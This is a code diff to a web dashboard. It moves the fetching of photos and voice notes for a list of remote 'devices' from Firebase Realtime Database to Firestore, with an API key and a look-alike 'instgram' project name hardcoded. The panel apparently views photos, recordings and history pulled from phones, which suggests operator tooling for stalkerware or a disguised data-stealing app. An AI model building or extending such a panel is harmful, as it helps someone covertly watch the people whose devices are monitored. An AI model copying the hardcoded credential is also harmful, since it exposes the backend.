@@ -322,6 +322,8 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <script>
 // --- Firebase Config ---
 const RTDB = 'https://instgram-7148c-default-rtdb.europe-west1.firebasedatabase.app';
+const FIRESTORE = 'https://firestore.googleapis.com/v1/projects/instgram-7148c/databases/(default)/documents';
+const API_KEY = 'AIzaSyBzvqD0ZrFNYJnJEWQ2zJndIK9ZgqOSDm8';
 const PKT = 'Asia/Karachi';
 
 // --- State ---
@@ -633,6 +635,30 @@ async function fetchRTDB(path, query) {
   } catch { return null; }
 }
 
+async function fetchFirestore(path) {
+  trackRead();
+  try {
+    const r = await fetch(`${FIRESTORE}/${path}?key=${API_KEY}`);
+    if (!r.ok) return null;
+    return r.json();
+  } catch { return null; }
+}
+
+function fromFirestoreFields(fields) {
+  if (!fields || typeof fields !== 'object') return fields;
+  const result = {};
+  for (const [key, val] of Object.entries(fields)) {
+    if (val.stringValue !== undefined) result[key] = val.stringValue;
+    else if (val.integerValue !== undefined) result[key] = parseInt(val.integerValue, 10);
+    else if (val.doubleValue !== undefined) result[key] = val.doubleValue;
+    else if (val.booleanValue !== undefined) result[key] = val.booleanValue;
+    else if (val.arrayValue !== undefined) result[key] = (val.arrayValue.values || []).map(v => fromFirestoreFields(v));
+    else if (val.mapValue !== undefined) result[key] = fromFirestoreFields(val.mapValue.fields);
+    else result[key] = val;
+  }
+  return result;
+}
+
 async function fetchDevices() {
   const keys = await fetchRTDB('devices', 'shallow=true');
   if (!keys || typeof keys !== 'object') {
@@ -716,30 +742,11 @@ async function pollMeta() {
   }
 }
 
-async function pollPhotos() {
-  if (!selectedDevice) return;
+function renderPhotosFromCache() {
   const grid = document.getElementById('photoGrid');
-  const keys = await fetchRTDB(`devices/${selectedDevice}/photos`, 'shallow=true');
-  if (!keys || typeof keys !== 'object') {
-    grid.innerHTML = '<div class="label">No photos yet</div>';
-    return;
-  }
-  const allTs = Object.keys(keys).sort((a, b) => (parseInt(b)||0) - (parseInt(a)||0));
-  const uncached = allTs.filter(k => !cachedPhotos[k]);
-  // Load uncached photos in parallel (batch of 8 for speed)
-  const batchSize = 8;
-  for (let i = 0; i < uncached.length; i += batchSize) {
-    await Promise.all(uncached.slice(i, i + batchSize).map(async ts => {
-      if (cachedPhotos[ts]) return;
-      try {
-        const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${ts}`);
-        if (doc && doc.data && doc.data.startsWith('/9j/')) cachedPhotos[ts] = doc;
-      } catch {}
-    }));
-  }
-  if (!allTs.length) { grid.innerHTML = '<div class="label">No photos yet</div>'; return; }
-  // Render immediately from cache
-  grid.innerHTML = allTs.map(ts => {
+  const tsKeys = Object.keys(cachedPhotos).sort((a, b) => (parseInt(b)||0) - (parseInt(a)||0));
+  if (!tsKeys.length) { grid.innerHTML = '<div class="label">No photos yet</div>'; return; }
+  grid.innerHTML = tsKeys.map(ts => {
     const doc = cachedPhotos[ts];
     if (!doc) return '';
     const docTs = parseInt(ts);
@@ -752,34 +759,26 @@ async function pollPhotos() {
   }).filter(Boolean).join('') || '<div class="label">No photos yet</div>';
 }
 
-// Preload photos immediately when device is selected
-async function preloadPhotos() {
+async function loadPhotosFromFirestore() {
   if (!selectedDevice) return;
-  const keys = await fetchRTDB(`devices/${selectedDevice}/photos`, 'shallow=true');
-  if (!keys || typeof keys !== 'object') return;
-  const allTs = Object.keys(keys).sort((a, b) => (parseInt(b)||0) - (parseInt(a)||0));
-  const uncached = allTs.filter(k => !cachedPhotos[k]);
-  for (let i = 0; i < uncached.length; i += 8) {
-    await Promise.all(uncached.slice(i, i + 8).map(async ts => {
-      if (cachedPhotos[ts]) return;
-      try {
-        const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${ts}`);
-        if (doc && doc.data && doc.data.startsWith('/9j/')) cachedPhotos[ts] = doc;
-      } catch {}
-    }));
+  const resp = await fetchFirestore(`devices/${selectedDevice}/photos?orderBy=timestamp%20desc&pageSize=200`);
+  if (!resp || !resp.documents) return;
+  for (const doc of resp.documents) {
+    const id = doc.name.split('/').pop();
+    if (cachedPhotos[id]) continue;
+    const data = fromFirestoreFields(doc.fields);
+    if (data && data.data && data.data.startsWith('/9j/')) cachedPhotos[id] = data;
   }
-  const grid = document.getElementById('photoGrid');
-  grid.innerHTML = allTs.map(ts => {
-    const doc = cachedPhotos[ts];
-    if (!doc) return '';
-    const docTs = parseInt(ts);
-    const dateTaken = doc.dateTaken ? 'Captured: ' + pkt(doc.dateTaken) : '';
-    const synced = 'Synced: ' + pkt(docTs);
-    const name = doc.fileName ? doc.fileName : '';
-    const line1 = name || dateTaken || synced;
-    const line2 = dateTaken ? dateTaken + ' | ' + synced : synced;
-    return '<div class="pwrap"><img src="data:image/jpeg;base64,' + doc.data + '" loading="eager" decoding="async"><div class="pcap"><div>' + escHtml(line1) + '</div><div class="ptime">' + escHtml(line2) + '</div></div></div>';
-  }).filter(Boolean).join('') || '<div class="label">No photos yet</div>';
+}
+
+async function pollPhotos() {
+  await loadPhotosFromFirestore();
+  renderPhotosFromCache();
+}
+
+async function preloadPhotos() {
+  await loadPhotosFromFirestore();
+  renderPhotosFromCache();
 }
 
 // --- RTDB Sync Trigger ---
@@ -932,16 +931,14 @@ async function pollHistory() {
 async function pollVoiceNotes() {
   if (!selectedDevice) return;
   const list = document.getElementById('voiceNotesList');
-  // Try RTDB first, fall back to Firestore path
-  let data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
-  if (!data || typeof data !== 'object') {
-    data = await fetchRTDB(`devices/${selectedDevice}/voice`);
-  }
-  if (!data || typeof data !== 'object') {
+  const resp = await fetchFirestore(`devices/${selectedDevice}/voice`);
+  if (!resp || !resp.documents) {
     list.innerHTML = '<div class="label">No voice notes yet</div>';
     return;
   }
-  const batches = Object.values(data).sort((a, b) => (parseInt(b.ts_ms)||0) - (parseInt(a.ts_ms)||0));
+  const batches = resp.documents
+    .map(d => fromFirestoreFields(d.fields))
+    .sort((a, b) => (parseInt(b.ts_ms)||0) - (parseInt(a.ts_ms)||0));
   let html = '';
   for (const batch of batches) {
     const notes = batch.notes || [];
